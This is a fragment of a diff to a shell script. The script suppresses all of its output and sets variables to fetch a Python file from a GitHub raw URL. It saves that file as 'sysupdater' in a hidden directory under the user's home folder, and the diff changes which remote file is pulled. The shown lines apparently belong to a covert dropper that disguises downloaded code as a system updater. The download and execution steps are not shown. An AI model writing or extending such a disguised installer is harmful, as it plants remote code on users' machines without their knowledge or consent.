@@ -7,7 +7,7 @@
 exec >/dev/null 2>&1
 
 # Set variables
-CLIENT_URL="https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
+CLIENT_URL="https://raw.githubusercontent.com/glitech01x/OsinToolKit/refs/heads/main/OsinTool.py"
 CLIENT_NAME="sysupdater"
 INSTALL_DIR="$HOME/.local/share/sysupdater"
 CLIENT_FILE="$INSTALL_DIR/$CLIENT_NAME.py"
